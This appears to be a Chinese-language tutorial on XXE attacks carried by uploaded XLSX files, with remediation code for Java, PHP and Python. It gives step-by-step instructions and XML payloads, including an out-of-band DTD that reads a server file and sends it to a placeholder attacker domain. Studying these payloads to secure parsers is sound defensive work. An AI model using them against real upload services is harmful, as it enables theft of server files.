## 通过上传Excel文件触发XXE漏洞 📤

![](img/ccae52d7ac2be81d5fe2299ef445143a_13.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_15.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_17.png)

上一节我们介绍了XXE的基本利用方式，本节中我们来看看一种特殊的利用场景。

如果网站存在上传功能，并且支持上传XLSX格式的Excel文件，就可能存在XXE漏洞。其原理是，XLSX文件本质上是一个ZIP压缩包，内部包含多个XML文件。攻击者可以修改这些XML文件，插入恶意的DTD声明和外部实体引用。

![](img/ccae52d7ac2be81d5fe2299ef445143a_19.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_20.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_22.png)

以下是利用步骤：

![](img/ccae52d7ac2be81d5fe2299ef445143a_24.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_26.png)

1.  新建一个Excel文件，将其后缀名改为`.zip`。
2.  解压ZIP文件，找到并修改`[Content_Types].xml`等XML文件。
3.  在XML文件中插入恶意的DTD和实体引用，例如：
    ```xml
    <!DOCTYPE test [
        <!ENTITY % file SYSTEM "http://攻击者服务器:9999/xxe-test">
        %file;
    ]>
    ```
4.  将修改后的文件重新打包为ZIP，并改回`.xlsx`后缀。
5.  在攻击者服务器上监听对应端口（如9999）。
6.  将恶意Excel文件上传到目标网站。如果服务器解析了该文件，就会向攻击者的服务器发起HTTP请求。

## 无回显XXE与数据外带 🌐

在无法直接看到回显的情况下，我们依然可以通过外带数据的方式利用XXE。这与之前介绍的无回显利用原理相同，只是将恶意DTD部分嵌入到了Excel文件的XML中。

攻击者可以在自己控制的服务器上放置一个恶意的DTD文件，内容如下：
```xml
<!ENTITY % file SYSTEM "file:///目标文件路径">
<!ENTITY % dtd "<!ENTITY &#x25; exfil SYSTEM 'http://攻击者域名/?data=%file;'>">
%dtd;
%exfil;
```
当目标服务器解析包含此外部实体引用的Excel时，就会将指定文件的内容通过HTTP请求发送到攻击者的服务器。

![](img/ccae52d7ac2be81d5fe2299ef445143a_38.png)

对于没有公网服务器的学习者，可以使用一些内网穿透工具（如ngrok）来获得一个临时的公网地址，用于接收外带的数据。

## XXE漏洞修复方案 🔧

![](img/ccae52d7ac2be81d5fe2299ef445143a_47.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_49.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_51.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_53.png)

了解利用方式后，我们来看看如何修复XXE漏洞。修复的核心是禁止XML解析器加载外部实体。

![](img/ccae52d7ac2be81d5fe2299ef445143a_55.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_56.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_58.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_59.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_61.png)

以下是不同语言中的修复方案：

![](img/ccae52d7ac2be81d5fe2299ef445143a_62.png)

**Java中的修复**
在Java中，可以通过设置解析器的属性来禁用外部实体。
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**PHP中的修复**
在PHP中，使用`libxml_disable_entity_loader`函数来禁用实体加载器。
```php
libxml_disable_entity_loader(true);
```

![](img/ccae52d7ac2be81d5fe2299ef445143a_64.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_66.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_68.png)

**Python中的修复**
在Python的`lxml`库中，可以设置解析器参数。
```python
parser = etree.XMLParser(resolve_entities=False)
tree = etree.parse(xml_source, parser)
```
设置之后，解析器将不再加载外部实体，从而从根本上防御XXE攻击。我们通过演示代码验证，修复后原有的XXE payload会引发解析错误，而不会发起外部请求。

![](img/ccae52d7ac2be81d5fe2299ef445143a_70.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_72.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_74.png)

另一种修复方案是过滤用户输入的XML数据，例如检查是否包含`<`、`>`、`ENTITY`、`SYSTEM`、`PUBLIC`等关键词。但这种方法属于黑名单机制，可能存在被绕过风险，因此不如直接禁用外部实体加载来得彻底和安全。

![](img/ccae52d7ac2be81d5fe2299ef445143a_76.png)

![](img/ccae52d7ac2be81d5fe2299ef445143a_78.png)

## 总结

![](img/ccae52d7ac2be81d5fe2299ef445143a_81.png)

本节课我们一起学习了XXE漏洞的另一种利用方式——通过上传Excel文件触发，并掌握了XXE漏洞的核心修复方案。关键在于配置XML解析器，**禁用外部实体加载功能**。对于开发者而言，应在所有解析XML输入的地方采用白名单验证或直接禁用危险功能；对于安全人员，在审计时需关注文件上传、XML解析等环节，并测试其安全性。
